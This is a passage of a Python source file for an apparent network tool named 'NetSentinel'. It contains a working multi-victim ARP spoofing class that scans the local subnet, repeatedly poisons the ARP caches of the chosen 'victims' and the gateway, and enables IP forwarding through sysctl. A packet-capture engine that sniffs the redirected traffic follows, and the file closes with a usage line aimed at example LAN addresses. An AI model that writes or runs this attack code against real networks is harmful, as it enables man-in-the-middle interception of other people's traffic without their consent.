        self.gateway_ip = None
        self.gateway_mac = None

    def get_mac(self, ip: str) -> str | None:
        """Resolve IP to MAC using Layer 2 ARP (works correctly with iface)."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=2, iface=self.interface, verbose=False)
            if ans and len(ans) > 0:
                return ans[0][1].hwsrc
            return None
        except Exception:
            return None

    def scan_network(self, subnet: str = None) -> list:
        """Scan local subnet for all active hosts. Returns list of {ip, mac} dicts."""
        if not subnet:
            try:
                our_ip = get_if_addr(self.interface)
                subnet = ".".join(our_ip.split(".")[:3]) + ".0/24"
            except Exception:
                return []
        try:
            our_ip = get_if_addr(self.interface)
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                         timeout=3, iface=self.interface, verbose=False)
        except Exception:
            return []
        hosts = []
        for sent, received in ans:
            if received.psrc != our_ip:
                hosts.append({"ip": received.psrc, "mac": received.hwsrc})
        return sorted(hosts, key=lambda h: [int(x) for x in h["ip"].split(".")])

    def _spoof_one(self, target_ip: str, target_mac: str, spoof_ip: str):
        our_mac = get_if_hwaddr(self.interface)
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=our_mac)
        sendp(packet, iface=self.interface, verbose=False)

    def start(self, victim_ip: str, gateway_ip: str):
        """victim_ip can be a single IP or comma-separated list."""
        if self.is_spoofing:
            return False

        self.victim_ips = [ip.strip() for ip in victim_ip.split(",") if ip.strip()]
        self.gateway_ip = gateway_ip
        self.victim_macs = {}

        for vip in self.victim_ips:
            mac = self.get_mac(vip)
            if mac:
                self.victim_macs[vip] = mac
            else:
                print(f"⚠️ [WARN] Could not resolve MAC for {vip}, skipping.")

        self.gateway_mac = self.get_mac(gateway_ip)
        if not self.gateway_mac:
            print("❌ [ERROR] Could not resolve MAC for gateway.")
            return False

        if not self.victim_macs:
            print("❌ [ERROR] No valid victims found on network.")
            return False

        # Update victim list to only include resolved hosts
        self.victim_ips = list(self.victim_macs.keys())
        self.is_spoofing = True
        self._enable_ip_forwarding()

        def _spoof_loop():
            while self.is_spoofing:
                our_mac = get_if_hwaddr(self.interface)
                # Tell each victim we are the gateway
                for vip, vmac in self.victim_macs.items():
                    self._spoof_one(vip, vmac, spoof_ip=self.gateway_ip)
                # Tell gateway we are each victim
                for vip in self.victim_ips:
                    packet = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                 psrc=vip, hwsrc=our_mac)
                    sendp(packet, iface=self.interface, verbose=False)
                time.sleep(1.5)

        self.spoof_thread = threading.Thread(target=_spoof_loop, daemon=True)
        self.spoof_thread.start()
        print(f"🎯 [ARP SPOOFING STARTED] Victims: {', '.join(self.victim_ips)} ↔ {gateway_ip} on {self.interface}")
        return True

    def stop(self):
        self.is_spoofing = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=5)
        self._restore_arp()

    def _enable_ip_forwarding(self):
        try:
            import platform
            if platform.system() == "Darwin":
                os.system("sysctl -w net.inet.ip.forwarding=1 > /dev/null 2>&1")
            elif platform.system() == "Linux":
                os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            print("✅ IP forwarding enabled")
        except Exception:
            pass

    def _restore_arp(self):
        if not self.gateway_ip or not self.gateway_mac or not self.victim_macs:
            return
        print("🔄 Restoring original ARP tables...")
        for vip, vmac in self.victim_macs.items():
            # Victim ← real gateway
            restore_victim = Ether(dst=vmac) / ARP(op=2, pdst=vip, hwdst=vmac,
                                 psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            sendp(restore_victim, count=7, iface=self.interface, verbose=False)
            # Gateway ← real victim
            restore_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                  psrc=vip, hwsrc=vmac)
            sendp(restore_gateway, count=7, iface=self.interface, verbose=False)
        print("✅ ARP tables restored.")


# ─────────────────────────────────────────────
# Live Capture Engine (100% unchanged)
# ─────────────────────────────────────────────
class CaptureEngine:
    """Manages live packet capture in a background thread."""

    def __init__(self, interface: str = None, max_packets: int = 0):
        self.parser = PacketParser()
        self.flow_agg = FlowAggregator()
        self.packet_queue = queue.Queue(maxsize=100000)
        self.packets = []
        self.max_packets = max_packets  # 0 = unlimited
        self.is_running = False
        self.interface = interface
        self.capture_thread = None
        self.stats = {
            "total_captured": 0,
            "total_analyzed": 0,
            "start_time": None,
            "threats_detected": 0,
        }

    def _packet_callback(self, packet):
        parsed = self.parser.parse(packet)
        if parsed:
            self.stats["total_captured"] += 1
            self.flow_agg.add_packet(parsed)
            if parsed.get("threat_level") in ("medium", "high"):
                self.stats["threats_detected"] += 1
            self.packets.append(parsed)
            if self.max_packets > 0 and len(self.packets) > self.max_packets:
                self.packets = self.packets[-self.max_packets:]
            try:
                self.packet_queue.put_nowait(parsed)
            except queue.Full:
                pass

    def start(self, count: int = 0, bpf_filter: str = None):
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is not installed. Run: pip install scapy")
        self.is_running = True
        self.stats["start_time"] = time.time()
        kwargs = {"prn": self._packet_callback, "store": False}
        if self.interface:
            kwargs["iface"] = self.interface
        if count > 0:
            kwargs["count"] = count
        if bpf_filter:
            kwargs["filter"] = bpf_filter

        def _run():
            try:
                sniff(**kwargs, stop_filter=lambda _: not self.is_running)
            except Exception as e:
                print(f"Capture error: {e}")
            finally:
                self.is_running = False

        self.capture_thread = threading.Thread(target=_run, daemon=True)
        self.capture_thread.start()

    def stop(self):
        self.is_running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=3)

    def get_recent_packets(self, n: int = 50) -> list:
        return self.packets[-n:]

    def get_all_packets_df(self) -> pd.DataFrame:
        if not self.packets:
            return pd.DataFrame()
        return pd.DataFrame(self.packets)


# ─────────────────────────────────────────────
# Quick test
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("✅ NetSentinel loaded with ARP Spoofing (multiple victims supported)!")
    print("Use: spoofer = ARPSpoofer() ; spoofer.start('192.168.1.100,192.168.1.101', '192.168.1.1')")